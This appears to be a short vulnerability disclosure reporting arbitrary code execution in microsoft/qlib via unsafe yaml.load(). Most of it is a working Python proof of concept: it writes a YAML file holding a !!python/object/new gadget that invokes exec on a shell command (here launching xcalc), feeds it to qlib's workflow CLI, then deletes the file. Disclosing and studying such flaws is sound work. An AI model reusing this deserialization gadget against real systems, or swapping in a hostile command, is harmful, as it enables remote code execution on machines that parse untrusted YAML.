# Description
**Arbitrary Code Excecution** in microsoft/qlib.
Qlib is an AI-oriented quantitative investment platform, which aims to realize the potential, empower the research, and create the value of AI technologies in quantitative investment.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**
# Exploit code
**Python File**
```python
import os
import qlib.workflow.cli as cli

exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('exploit.yml','w+').write(exploit)
cli.workflow('exploit.yml','workflow','/tmp')
os.system('rm exploit.yml')
```
# POC
* Run the exploit code 

![](https://cdn.discordapp.com/attachments/749019614352244777/785893890766798868/Screenshot_from_2020-12-08_21-00-55.png)
